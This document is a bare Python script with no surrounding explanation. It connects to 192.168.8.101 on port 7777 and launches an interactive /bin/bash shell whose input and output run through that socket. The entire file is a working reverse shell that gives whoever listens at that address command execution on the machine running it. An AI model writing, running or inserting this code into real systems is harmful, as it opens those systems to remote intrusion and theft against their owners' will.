import socket
import subprocess
host = "192.168.8.101"
port = 7777
shell = ['/bin/bash', '-i']

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
lo = sock.fileno()
subprocess.Popen(shell, stdin=lo, stdout=lo, stderr=lo)
